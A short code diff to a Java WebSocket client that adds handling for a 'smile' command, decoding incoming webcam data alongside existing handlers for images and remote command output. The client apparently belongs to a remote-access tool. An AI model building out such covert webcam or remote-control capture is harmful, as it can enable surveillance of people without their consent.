@@ -75,6 +75,8 @@ public class Client extends WebSocketClient {
                         commands.decodeImg(jsonNode.get("data").asText());
                     }else if(jsonNode.get("command").asText().equals("cmd")){
                         System.out.println(jsonNode.get("data").asText().replace("\\n", "\n").replace("\"", ""));
+                    }else if(jsonNode.get("command").asText().equals("smile")){
+                        commands.decodeCam(jsonNode.get("data").asText());
                     }else {
                         System.out.println(jsonNode.get("data").asText());
                     }
